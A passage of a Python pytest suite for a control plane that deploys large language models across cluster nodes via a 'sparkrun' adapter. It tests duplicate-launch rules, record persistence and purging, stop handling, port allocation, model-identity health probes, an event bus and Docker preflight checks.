    assert wait_for(lambda: first.get(deployment.deployment_id).state is S.READY)
    first.close()

    # A real SparkrunAdapter whose binary cannot be found -- available() is
    # False, exactly like test_check_job_survives_a_missing_sparkrun, now
    # exercised through reconcile() instead of a direct check_job() call.
    adapter = SparkrunAdapter(
        registry, recipe_dir=tmp_path / "recipes", binary="sparkrun-does-not-exist"
    )
    probe = FakeProbe(healthy_by_default=False)  # backend not answering either
    second = DeploymentManager(
        adapter, registry, state_dir=tmp_path, probe_fn=probe,
        autostart=False, ready_poll_interval_s=0.01, ready_timeout_s=5.0,
    )
    adopted = second.reconcile()

    assert [d.state for d in adopted] == [S.LAUNCHING]
    assert "could not confirm" in second.get(deployment.deployment_id).last_error
    second.close()


def test_a_relaunch_of_the_same_model_on_the_same_nodes_is_refused(tmp_path):
    manager = make_manager(tmp_path)
    first = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    with pytest.raises(DuplicateDeployment) as excinfo:
        manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert excinfo.value.existing.deployment_id == first.deployment_id
    assert len(manager.list()) == 1
    manager.close()


def test_a_second_copy_of_a_model_under_another_name_is_refused(tmp_path):
    """The rule is one copy per node, not one served name per node.

    A served name is a label the caller may pick; the GPU it would land on is
    not. Keyed on the name alone this launch went through, and the node ended
    up loading the same weights twice out of the unified memory the fit gate
    had budgeted for one of them.
    """
    manager = make_manager(tmp_path)
    first = manager.launch(
        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 65536, 256
    )
    with pytest.raises(DuplicateDeployment) as excinfo:
        manager.launch(
            fx.GPT_OSS_120B,
            fx.single_node_plan("spark-01"),
            fx.fits(),
            "vllm",
            65536,
            256,
            served_name="gpt-oss-120b-second",
        )
    assert excinfo.value.existing.deployment_id == first.deployment_id
    assert excinfo.value.clash == "model"
    # The refusal renders verbatim, so it has to name the model, the machine,
    # the deployment in the way, and the way out.
    message = str(excinfo.value)
    assert "openai/gpt-oss-120b" in message
    assert "spark-01" in message
    assert first.deployment_id in message
    assert "Stop" in message
    assert len(manager.list()) == 1
    manager.close()


def test_the_model_rule_is_reported_ahead_of_the_name_rule(tmp_path):
    """Both rules can fire at once; the wider one is the useful sentence.

    Told to rename, an operator renames -- and is refused again, this time for
    the reason that was true all along.
    """
    manager = make_manager(tmp_path)
    manager.launch(
        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 65536, 256
    )
    with pytest.raises(DuplicateDeployment) as excinfo:
        manager.launch(
            fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 4096, 8
        )
    assert excinfo.value.clash == "model"
    assert "different name" not in str(excinfo.value)
    manager.close()


def test_the_same_model_on_a_node_that_is_not_running_it_is_allowed(tmp_path):
    """The rule is per node. A second copy elsewhere is a second machine."""
    manager = make_manager(tmp_path)
    first = manager.launch(
        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 65536, 256
    )
    second = manager.launch(
        fx.GPT_OSS_120B,
        fx.single_node_plan("spark-02"),
        fx.fits(),
        "vllm",
        65536,
        256,
        served_name="gpt-oss-120b-b",
    )
    assert first.deployment_id != second.deployment_id
    assert len(manager.list()) == 2
    manager.close()


def test_one_served_name_cannot_be_launched_twice_anywhere_in_the_cluster(tmp_path):
    """The name rule is cluster-wide, not per node.

    Scoped by node it let one served name be launched on two machines: the
    floor then drew two bands with one caption, /v1 routed to both, and an
    operator told to stop it had two deployments and no way to tell which one
    answered. Different model, different machine, same name -- and the model
    rule cannot be what catches this, which is the point of the fixture.
    """
    manager = make_manager(tmp_path)
    first = manager.launch(
        fx.GPT_OSS_120B,
        fx.single_node_plan("spark-01"),
        fx.fits(),
        "vllm",
        65536,
        256,
        served_name="house-model",
    )
    with pytest.raises(DuplicateDeployment) as excinfo:
        manager.launch(
            fx.QWEN3_30B_A3B,
            fx.single_node_plan("spark-02"),
            fx.fits(),
            "vllm",
            65536,
            256,
            served_name="house-model",
        )
    assert excinfo.value.clash == "served_name"
    assert excinfo.value.existing.deployment_id == first.deployment_id
    # Verbatim, so it has to name the deployment in the way and the way out.
    message = str(excinfo.value)
    assert "house-model" in message
    assert first.deployment_id in message
    assert "different name" in message
    assert len(manager.list()) == 1
    manager.close()


def test_a_replica_under_its_own_name_is_still_allowed(tmp_path):
    """What the widened name rule must NOT cost.

    ``planner.py`` recommends a second replica in as many words -- "run a
    second replica on spark-02 and let the gateway load balance" -- and this
    is the launch that takes that advice. It stays legal; it just has to be
    asked for under its own name.
    """
    manager = make_manager(tmp_path)
    manager.launch(
        fx.GPT_OSS_120B,
        fx.single_node_plan("spark-01"),
        fx.fits(),
        "vllm",
        65536,
        256,
        served_name="house-model",
    )
    manager.launch(
        fx.GPT_OSS_120B,
        fx.single_node_plan("spark-02"),
        fx.fits(),
        "vllm",
        65536,
        256,
        served_name="house-model-b",
    )
    assert len(manager.list()) == 2
    manager.close()


def test_a_name_freed_by_a_failed_deployment_can_be_relaunched(tmp_path):
    """A cluster-wide rule must not make a name unusable after a failure.

    This is the case that produced the report: three tries at one model, each
    one refused would have left the name spent for good.
    """
    manager = make_manager(tmp_path)
    first = manager.launch(
        fx.GPT_OSS_120B,
        fx.single_node_plan("spark-01"),
        fx.fits(),
        "vllm",
        65536,
        256,
        served_name="house-model",
    )
    manager._records[first.deployment_id].deployment.state = S.FAILED
    second = manager.launch(
        fx.GPT_OSS_120B,
        fx.single_node_plan("spark-01"),
        fx.fits(),
        "vllm",
        65536,
        256,
        served_name="house-model",
    )
    assert second.deployment_id != first.deployment_id
    manager.close()


def test_a_plan_overlapping_one_node_of_a_running_deployment_is_refused(tmp_path):
    """Overlap, not equality. PP=2 over [01, 02] occupies spark-01's GPU too."""
    manager = make_manager(tmp_path)
    manager.launch(
        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 65536, 256
    )
    with pytest.raises(DuplicateDeployment) as excinfo:
        manager.launch(
            fx.GPT_OSS_120B,
            fx.pp2_plan(["spark-01", "spark-02"]),
            fx.fits(),
            "vllm",
            65536,
            256,
            served_name="gpt-oss-120b-wide",
        )
    assert excinfo.value.clash == "model"
    manager.close()


def test_a_different_model_on_the_same_node_is_untouched_by_the_rule(tmp_path):
    """Two models sharing a machine is the normal case, and stays legal.

    The fit gate is what decides whether they both fit; this rule must not
    quietly become a second, cruder memory check.
    """
    manager = make_manager(tmp_path)
    manager.launch(
        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 65536, 256
    )
    other = manager.launch(
        fx.LLAMA_3_3_70B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 8192, 16
    )
    assert other.shape.model_id == "meta-llama/Llama-3.3-70B-Instruct"
    assert len(manager.list()) == 2
    manager.close()


def test_a_stopped_deployment_does_not_hold_its_node_against_a_relaunch(tmp_path):
    """History occupies no GPU. Otherwise a failed launch bricks the node."""
    manager = make_manager(tmp_path)
    first = manager.launch(
        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 65536, 256
    )
    manager._records[first.deployment_id].deployment.state = S.STOPPED
    again = manager.launch(
        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 65536, 256
    )
    assert again.deployment_id != first.deployment_id
    manager.close()


def test_planned_deployments_are_never_persisted(tmp_path):
    """Nothing was launched, so there is nothing to reconcile against."""
    store = DeploymentStore(tmp_path / "deployments")
    deployment = Deployment(
        "d-x", "m", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
        S.PLANNED, None, 4096, 8, None, None,
    )
    assert store.save(deployment) is None
    assert store.load_all() == []


def test_store_survives_a_corrupt_record(tmp_path):
    """One bad file must not stop the control plane from adopting the rest."""
    store = DeploymentStore(tmp_path / "deployments")
    good = Deployment(
        "d-good", "m", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
        S.READY, "http://h:8100/v1", 4096, 8, 1.0, None,
    )
    store.save(good, {"cluster_id": "sparkrun_1"})
    (tmp_path / "deployments" / "d-bad.json").write_text("{ this is not json")
    loaded = store.load_all()
    assert [d.deployment_id for d, _ in loaded] == ["d-good"]


def test_store_roundtrips_every_contract_field(tmp_path):
    store = DeploymentStore(tmp_path / "deployments")
    original = Deployment(
        "d-1", "gpt-oss-120b", fx.GPT_OSS_120B, fx.pp2_plan(), fx.wont_fit(), "sglang",
        S.DEGRADED, "http://h:8100/v1", 65536, 256, 1757193600.0, "some error",
    )
    store.save(original, {"cluster_id": "sparkrun_abc", "hosts": ["a", "b"], "port": 8100})
    (restored, handle), = store.load_all()
    assert restored == original
    assert restored.fit.reason == original.fit.reason
    assert restored.plan.rejected == original.plan.rejected
    assert handle["cluster_id"] == "sparkrun_abc"


def test_a_schema_v1_record_still_loads_after_modality_was_added(tmp_path):
    """Adding a contract field must not orphan what is already on disk.

    The codec is hand-written precisely so a contract change is noticed, but
    "noticed" has to mean a default, not a KeyError on every restart. A record
    written before modality existed was necessarily a text deployment, so the
    default is also the truth.
    """
    store = DeploymentStore(tmp_path / "deployments")
    current = Deployment(
        "d-1", "gpt-oss-120b", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
        S.READY, "http://h:8100/v1", 4096, 8, 1757193600.0, None,
    )
    path = store.save(current, {"port": 8100})

    # Rewrite it as v1: no modality key anywhere, which is exactly what the
    # previous build wrote.
    raw = json.loads(path.read_text())
    raw["schema_version"] = 1
    del raw["deployment"]["modality"]
    path.write_text(json.dumps(raw))

    (restored, _), = store.load_all()
    assert restored.modality is Modality.TEXT
    assert restored == current


def test_modality_survives_a_store_roundtrip(tmp_path):
    store = DeploymentStore(tmp_path / "deployments")
    original = Deployment(
        "d-2", "kokoro", fx.GPT_OSS_120B, fx.single_node_plan(), fx.fits(), "vllm",
        S.READY, "http://h:8100/v1", 4096, 8, 1757193600.0, None,
        modality=Modality.SPEECH,
    )
    store.save(original, {"port": 8100})
    (restored, _), = store.load_all()
    assert restored.modality is Modality.SPEECH


# ==========================================================================
# Low: FAILED/STOPPED records must not accumulate forever. purge_expired()
# is the terminal-record GC; reconcile() runs it once per restart.
# ==========================================================================


def test_purge_expired_removes_only_old_terminal_records(tmp_path):
    store = DeploymentStore(tmp_path / "deployments")
    old_terminal = Deployment(
        "d-old", "m", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
        S.STOPPED, None, 4096, 8, None, "torn down",
    )
    fresh_terminal = Deployment(
        "d-fresh", "m", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
        S.FAILED, None, 4096, 8, None, "crashed",
    )
    still_live = Deployment(
        "d-live", "m", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
        S.READY, "http://h:8100/v1", 4096, 8, 1.0, None,
    )
    old_path = store.save(old_terminal)
    store.save(fresh_terminal)
    store.save(still_live)
    old_time = time.time() - 8 * 24 * 3600  # past the default 7-day window
    os.utime(old_path, (old_time, old_time))

    removed = store.purge_expired(7 * 24 * 3600.0)

    assert removed == 1
    remaining = {d.deployment_id for d, _ in store.load_all()}
    assert remaining == {"d-fresh", "d-live"}


def test_purge_expired_leaves_a_terminal_record_inside_the_window(tmp_path):
    store = DeploymentStore(tmp_path / "deployments")
    recent = Deployment(
        "d-recent", "m", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
        S.STOPPED, None, 4096, 8, None, None,
    )
    store.save(recent)
    assert store.purge_expired(7 * 24 * 3600.0) == 0
    assert [d.deployment_id for d, _ in store.load_all()] == ["d-recent"]


def test_reconcile_garbage_collects_expired_terminal_records(tmp_path):
    """delete() had zero callers before this; reconcile() is now the one
    that gives it a job, once per restart, on the shipped retention window."""
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    store = DeploymentStore(tmp_path / "deployments")
    old_terminal = Deployment(
        "d-old", "m", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
        S.STOPPED, None, 4096, 8, None, "torn down",
    )
    old_path = store.save(old_terminal)
    old_time = time.time() - 8 * 24 * 3600
    os.utime(old_path, (old_time, old_time))

    manager = make_manager(tmp_path, registry=registry)
    manager.reconcile()

    assert manager.store.load_all() == []
    manager.close()


# ==========================================================================
# stop()
# ==========================================================================


def test_stop_tears_down_and_confirms(tmp_path):
    manager = make_manager(tmp_path)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    manager.stop(deployment.deployment_id)
    assert manager.get(deployment.deployment_id).state is S.STOPPED
    assert manager.adapter.stops
    assert not manager.adapter.running

    states = [(e["from"], e["to"]) for e in drain(manager.bus, ev.STATE_CHANGED)]
    assert ("ready", "stopping") in states and ("stopping", "stopped") in states
    manager.close()


def test_an_unconfirmed_stop_escalates_and_says_what_was_left_behind(tmp_path):
    manager = make_manager(tmp_path)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    manager.adapter.stop_confirms = False
    manager.stop(deployment.deployment_id)

    live = manager.get(deployment.deployment_id)
    assert live.state is S.STOPPED
    assert "did not confirm" in live.last_error
    assert manager.adapter.launches[0]  # sanity
    escalations = drain(manager.bus, ev.STOP_ESCALATED)
    assert escalations
    assert escalations[0]["cluster_id"] in live.last_error
    assert fx.SPARK_01.address in escalations[0]["hosts"]
    manager.close()


def test_stopping_a_launch_in_flight_tears_it_down_rather_than_orphaning_it(tmp_path):
    """The lifecycle has no LAUNCHING -> STOPPING edge. Leaving the container
    running because the diagram has no arrow for it would orphan a workload."""
    probe = FakeProbe(healthy_by_default=False)  # never becomes ready
    manager = make_manager(tmp_path, probe=probe)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.adapter.running)

    manager.stop(deployment.deployment_id)

    live = manager.get(deployment.deployment_id)
    assert live.state is S.FAILED
    assert "stop requested" in live.last_error
    assert manager.adapter.stops  # torn down, not orphaned
    assert not manager.adapter.running
    manager.close()


def test_stopping_an_unknown_deployment_raises(tmp_path):
    manager = make_manager(tmp_path)
    with pytest.raises(KeyError):
        manager.stop("d-nope")
    manager.close()


def test_stopping_twice_is_a_no_op(tmp_path):
    manager = make_manager(tmp_path)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)
    manager.stop(deployment.deployment_id)
    manager.stop(deployment.deployment_id)  # must not raise
    assert manager.get(deployment.deployment_id).state is S.STOPPED
    manager.close()


# ==========================================================================
# Port allocation and identity
# ==========================================================================


def test_concurrent_deployments_get_distinct_ports(tmp_path):
    manager = make_manager(tmp_path)
    a = manager.launch(fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 8192, 8)
    b = manager.launch(fx.QWEN3_30B_A3B, fx.single_node_plan("spark-02"), fx.fits(), "vllm", 8192, 8)
    assert wait_for(lambda: all(manager.get(d.deployment_id).state is S.READY for d in (a, b)))
    ports = {manager._records[d.deployment_id].handle["port"] for d in (a, b)}
    assert ports == {8100, 8101}
    manager.close()


def test_a_port_something_else_is_listening_on_is_skipped(tmp_path):
    """The record counter is not the whole truth about a port.

    It knows only what THIS control plane started, so a runtime somebody else
    left running -- or one of ours orphaned by a restart that forgot it -- was
    invisible, 8100 got handed out on top of it, and the launch adopted the
    stranger as its own backend.
    """
    manager = make_manager(tmp_path, port_free_fn=lambda port: port not in (8100, 8101))
    d = manager.launch(
        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 8192, 8
    )
    assert manager._records[d.deployment_id].handle["port"] == 8102
    manager.close()


def test_a_machine_with_no_free_port_still_gets_one(tmp_path):
    """The bind check is an improvement on a guess, not a gate.

    Refusing the launch outright would make a machine whose port scan comes
    back full undeployable, on the strength of a check that cannot see the
    remote node the plan actually places on. The identity probe is what
    protects the deployment; this only makes the collision rarer.
    """
    manager = make_manager(tmp_path, port_free_fn=lambda port: False)
    d = manager.launch(
        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 8192, 8
    )
    assert manager._records[d.deployment_id].handle["port"] == 8100
    manager.close()


def test_a_backend_serving_another_model_is_not_adopted_as_ours(tmp_path):
    """The failure this whole check exists for.

    A llama-server left on 8100 answered /v1/models, the readiness wait took
    the 200 as proof, and `Qwen2.5-0.5B-Instruct` went READY pointing at a
    process serving `ling-3.0-flash`. Routing then sent it real traffic: a
    request for one model was answered, with no error anywhere, by another.
    """
    def stranger(backend_url, timeout=3.0, expect_model=None):
        # Liveness alone still says yes, which is exactly the trap: the old
        # probe asked only this question and got the answer it wanted.
        if not expect_model:
            return True, None
        return False, (
            "%s/v1/models is serving ling-3.0-flash, not %s -- something else "
            "is already on this port." % (backend_url, expect_model)
        )

    manager = make_manager(tmp_path, probe=stranger, ready_timeout_s=0.3)
    d = manager.launch(
        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 8192, 8
    )
    assert wait_for(lambda: manager.get(d.deployment_id).state is S.FAILED)
    assert "ling-3.0-flash" in manager.get(d.deployment_id).last_error
    manager.close()


def test_reconcile_retires_a_record_whose_port_holds_a_stranger(tmp_path):
    """And the restart path, which is where it actually happened.

    Left LAUNCHING the record keeps the same url, the ready-waiter keeps
    finding a stranger that answers, and the next restart re-adopts it. The
    probe's own sentence is the reason, so the operator is sent to the server
    holding the port rather than told their launch is merely slow.
    """
    first = make_manager(tmp_path)
    d = first.launch(
        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 8192, 8
    )
    assert wait_for(lambda: first.get(d.deployment_id).state is S.READY)
    first.close()

    def stranger(backend_url, timeout=3.0, expect_model=None):
        return False, (
            "%s/v1/models is serving ling-3.0-flash, not %s -- something else "
            "is already on this port." % (backend_url, expect_model)
        )

    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    second = DeploymentManager(
        FakeAdapter(registry, recipe_dir=tmp_path / "recipes"),
        registry,
        state_dir=tmp_path,
        probe_fn=stranger,
        port_free_fn=lambda port: True,
        autostart=False,
        ready_poll_interval_s=0.01,
        ready_timeout_s=1.0,
    )
    second.reconcile()
    assert second.get(d.deployment_id).state is S.FAILED
    assert "ling-3.0-flash" in second.get(d.deployment_id).last_error
    second.close()


def test_the_identity_check_reads_every_model_list_shape():
    """vLLM, and the llama-server that caused this. Both name what they serve."""
    vllm = {"data": [{"id": "Qwen2.5-0.5B-Instruct", "root": "Qwen/Qwen2.5-0.5B-Instruct"}]}
    llama = {"models": [{"name": "ling-3.0-flash", "model": "ling-3.0-flash"}],
             "data": [{"id": "ling-3.0-flash"}]}
    assert health.serves(health._names(vllm), "Qwen2.5-0.5B-Instruct")
    # A runtime reporting the repository path it loaded is agreeing with the
    # served name, not contradicting it: default_served_name IS that tail.
    assert health.serves(health._names(vllm), "Qwen/Qwen2.5-0.5B-Instruct")
    assert not health.serves(health._names(llama), "Qwen2.5-0.5B-Instruct")
    assert health.serves(health._names(llama), "ling-3.0-flash")


def test_a_port_that_names_nothing_is_probed_on_liveness_alone():
    """Absence of a model list is not evidence of the wrong model.

    A runtime behind a proxy that never spoke this dialect has always been
    probed on liveness, and this check must not start killing it.
    """
    assert health._names({"object": "list"}) == []
    assert health._names("not json at all") == []
    assert not health.wrong_model(None)
    assert not health.wrong_model("http://x/v1/models unreachable: refused")
    assert health.wrong_model(
        "http://x/v1/models is serving a, not b -- something else is already "
        "on this port. Stop that server"
    )


def test_default_served_name_is_the_tail_of_the_model_id():
    assert default_served_name(fx.GPT_OSS_120B) == "gpt-oss-120b"
    assert default_served_name(fx.LLAMA_3_3_70B) == "Llama-3.3-70B-Instruct"


# ==========================================================================
# The event bus itself
# ==========================================================================


def test_a_slow_subscriber_drops_events_instead_of_stalling_the_producer():
    bus = EventBus()

    async def main():
        it = bus.subscribe()
        task = asyncio.create_task(it.__anext__())
        await asyncio.sleep(0)
        for i in range(2000):  # far past the queue bound
            bus.emit(ev.STATE_CHANGED, seq=i)
        assert await asyncio.wait_for(task, 2.0)
        await it.aclose()

    asyncio.run(main())
    assert len(bus.recent()) == 256  # the ring buffer, not unbounded


def test_unsubscribing_removes_the_subscriber():
    bus = EventBus()

    async def main():
        it = bus.subscribe()
        task = asyncio.create_task(it.__anext__())
        await asyncio.sleep(0)
        bus.emit(ev.STATE_CHANGED)
        await task
        assert bus.subscriber_count == 1
        await it.aclose()
        assert bus.subscriber_count == 0

    asyncio.run(main())


# ==========================================================================
# Day 0 stub. Agent G codes against this before sparkrun is wired.
# ==========================================================================


def test_both_managers_satisfy_the_port(tmp_path):
    assert isinstance(StubDeploymentManager(), DeploymentPort)
    assert isinstance(make_manager(tmp_path), DeploymentPort)


def test_stub_fakes_the_lifecycle_with_timers():
    stub = StubDeploymentManager(launch_seconds=0.2)
    deployment = stub.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert deployment.state is S.LAUNCHING
    assert deployment.backend_url == "http://127.0.0.1:8100/v1"
    assert wait_for(lambda: stub.get(deployment.deployment_id).state is S.READY, timeout=2.0)
    assert stub.get(deployment.deployment_id).started_at is not None
    stub.close()


def test_stub_default_launch_time_is_three_seconds():
    from control_plane.deploy.stub import LAUNCH_SECONDS

    assert LAUNCH_SECONDS == 3.0


def test_stub_drives_admission_for_agent_g():
    stub = StubDeploymentManager(launch_seconds=0.05)
    deployment = stub.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: stub.get(deployment.deployment_id).state is S.READY, timeout=2.0)

    stub.simulate_memory(deployment.deployment_id, "spark-01", 96.0)
    assert stub.get(deployment.deployment_id).state is S.DEGRADED
    assert stub.admitting(deployment.deployment_id) is False
    critical = drain(stub.bus, ev.MEMORY_CRITICAL)
    assert critical and critical[0]["admitting"] is False

    stub.simulate_memory(deployment.deployment_id, "spark-01", 20.0)
    assert stub.get(deployment.deployment_id).state is S.READY
    assert stub.admitting(deployment.deployment_id) is True

    stub.simulate_backend_death(deployment.deployment_id, "killed for the demo")
    assert stub.get(deployment.deployment_id).state is S.FAILED
    assert stub.get(deployment.deployment_id).last_error == "killed for the demo"
    stub.close()


def test_stub_matches_the_real_manager_on_stopping_a_launch():
    stub = StubDeploymentManager(launch_seconds=30.0)
    deployment = stub.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert deployment.state is S.LAUNCHING
    stub.stop(deployment.deployment_id)
    live = stub.get(deployment.deployment_id)
    assert live.state is S.FAILED
    assert "stop requested" in live.last_error
    stub.close()


def test_stub_renders_the_real_command():
    """The UI must not be developed against a fictional command line."""
    stub = StubDeploymentManager()
    argv = stub.render_command(fx.pp2_plan(), fx.GPT_OSS_120B, "vllm", 65536, 512)
    assert argv[:2] == ["sparkrun", "run"]
    assert "--pp" in argv
    stub.close()


def test_stub_enforces_the_same_fsm():
    stub = StubDeploymentManager(launch_seconds=0.05)
    deployment = stub.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: stub.get(deployment.deployment_id).state is S.READY, timeout=2.0)
    stub.simulate_backend_death(deployment.deployment_id)
    record = stub._records[deployment.deployment_id]
    with pytest.raises(IllegalTransition):
        stub._transition(record, S.READY)
    assert stub.get(deployment.deployment_id).state is S.FAILED
    stub.close()


# ==========================================================================
# Real sparkrun. These are what "verified against real sparkrun flags" means.
# ==========================================================================


@needs_sparkrun
def test_the_rendered_command_is_accepted_by_real_sparkrun(tmp_path):
    """Render a PP=2 launch, write its recipe, and put it through sparkrun's
    own dry run. Exercises argument parsing and recipe validation for real."""
    adapter = SparkrunAdapter(
        FakeRegistry(fx.SPARK_01, fx.SPARK_02), recipe_dir=tmp_path / "recipes"
    )
    recipe = adapter.recipe_for(fx.pp2_plan(), fx.GPT_OSS_120B, "vllm", 65536, 512)
    materialize(recipe)
    argv = adapter.render_command(
        fx.pp2_plan(), fx.GPT_OSS_120B, "vllm", 65536, 512, recipe=recipe
    )
    proc = subprocess.run(argv + ["--dry-run"], capture_output=True, text=True, timeout=180)
    assert proc.returncode == 0, proc.stdout + proc.stderr

    output = proc.stdout + proc.stderr
    # The planner's decision actually reached the serve command. This is the
    # assertion that catches a silently-dropped override.
    assert "--pipeline-parallel-size 2" in output
    assert "--tensor-parallel-size 1" in output
    assert "--max-model-len 65536" in output
    assert "--max-num-seqs 512" in output
    assert "--served-model-name gpt-oss-120b" in output
    assert "--port 8100" in output
    # And the handle we track it by is parseable out of the output.
    from control_plane.deploy.sparkrun import CLUSTER_ID_RE, HEAD_HOST_RE

    assert CLUSTER_ID_RE.search(output)
    assert HEAD_HOST_RE.search(output).group(1) == fx.SPARK_01.address


@needs_sparkrun
def test_synthesized_recipes_validate_for_every_runtime(tmp_path):
    from control_plane.deploy.flags import SUPPORTED_RUNTIMES

    # Every runtime in the table, not a list typed here: a new one that writes
    # a recipe sparkrun will not read is exactly what this test is for, and it
    # can only catch it if it is asked about it.
    for runtime in SUPPORTED_RUNTIMES:
        adapter = SparkrunAdapter(
            FakeRegistry(fx.SPARK_01, fx.SPARK_02), recipe_dir=tmp_path / runtime
        )
        # tts is a single process; a two-rank plan is not something it would
        # ever be launched with (deploy/flags.py::sharding_refusal).
        plan = fx.single_node_plan() if runtime == "tts" else fx.pp2_plan()
        shape = fx.AUDIO8_TTS_0_6B if runtime == "tts" else fx.GPT_OSS_120B
        recipe = adapter.recipe_for(plan, shape, runtime, 32768, 256)
        path = materialize(recipe)
        proc = subprocess.run(
            ["sparkrun", "recipe", "validate", str(path)],
            capture_output=True, text=True, timeout=120,
        )
        assert proc.returncode == 0, "%s: %s" % (runtime, proc.stdout + proc.stderr)


@needs_sparkrun
def test_we_can_still_talk_to_the_sparkrun_we_verified_against():
    from control_plane.deploy.flags import SPARKRUN_VERIFIED_VERSION

    version = SparkrunAdapter().version()
    assert version, "sparkrun --version returned nothing"
    if version != SPARKRUN_VERIFIED_VERSION:
        pytest.skip(
            "sparkrun %s installed, flags verified against %s; re-verify "
            "control_plane/deploy/flags.py" % (version, SPARKRUN_VERIFIED_VERSION)
        )


def test_missing_sparkrun_fails_with_an_actionable_message(tmp_path):
    """No silent fallback to launching vLLM by hand."""
    adapter = SparkrunAdapter(recipe_dir=tmp_path, binary="sparkrun-does-not-exist")
    assert adapter.available() is False
    with pytest.raises(SparkrunNotInstalled) as excinfo:
        adapter.require()
    message = str(excinfo.value)
    assert "uv tool install sparkrun" in message
    assert "will not launch vLLM" in message

    manager = DeploymentManager(
        adapter, FakeRegistry(fx.SPARK_01), state_dir=tmp_path, autostart=False
    )
    with pytest.raises(SparkrunNotInstalled):
        manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert manager.list() == []


def test_check_job_survives_a_missing_sparkrun(tmp_path):
    """Reconcile must not blow up when sparkrun is absent.

    M-16, the ``available()`` branch: this used to assert ``running is
    False``, i.e. "confirmed not running". That conflated "this process
    cannot find the sparkrun binary right now" with "the workload is
    definitely gone" -- the exact bug M-16 flags for the TIMEOUT branch,
    just reached a different way (a control plane that restarts into an
    environment temporarily missing the binary would retire every live
    deployment it could not also reach over HTTP). ``running`` must be
    None: absence of evidence, not evidence of absence. See
    test_reconcile_does_not_retire_a_deployment_when_sparkrun_is_unavailable
    below for the same fix exercised through reconcile().
    """
    adapter = SparkrunAdapter(recipe_dir=tmp_path, binary="sparkrun-does-not-exist")
    result = adapter.check_job("sparkrun_abc")
    assert result["running"] is None
    assert "install" in result["error"].lower()
    assert adapter.is_running("sparkrun_abc") is None


# ==========================================================================
# Docker. Host networking is the one that silently ruins the demo.
# ==========================================================================


def _free_ports(count: int) -> list[int]:
    """Ports nothing is listening on right now.

    Host networking shares the host's ports, so a hardcoded one can collide
    with anything else on the machine -- including another agent's tests.
    """
    import socket as _socket

    sockets = []
    try:
        for _ in range(count):
            sock = _socket.socket()
            sock.bind(("0.0.0.0", 0))
            sockets.append(sock)
        return [s.getsockname()[1] for s in sockets]
    finally:
        for sock in sockets:
            sock.close()


def _preflight_module():
    import importlib.util

    spec = importlib.util.spec_from_file_location(
        "derate_preflight", REPO / "docker" / "preflight.py"
    )
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_preflight_names_the_flag_in_its_refusal():
    module = _preflight_module()
    assert "--network host" in module.BRIDGE_MESSAGE
    assert "network_mode: host" in module.BRIDGE_MESSAGE
    assert "mDNS" in module.BRIDGE_MESSAGE


def test_preflight_passes_outside_a_container(monkeypatch):
    module = _preflight_module()
    monkeypatch.setattr(module, "in_container", lambda: False)
    import io

    assert module.check(stream=io.StringIO()) is True


def test_preflight_refuses_when_every_interface_is_a_veth(monkeypatch):
    import io

    module = _preflight_module()
    monkeypatch.setattr(module, "in_container", lambda: True)
    monkeypatch.setattr(module, "interfaces", lambda: ["eth0"])
    monkeypatch.setattr(module, "is_veth", lambda name: True)
    monkeypatch.setattr(module.Path, "exists", lambda self: False)

    stream = io.StringIO()
    assert module.check(stream=stream) is False
    assert "--network host" in stream.getvalue()


def test_preflight_accepts_a_visible_host_bridge(monkeypatch):
    import io

    module = _preflight_module()
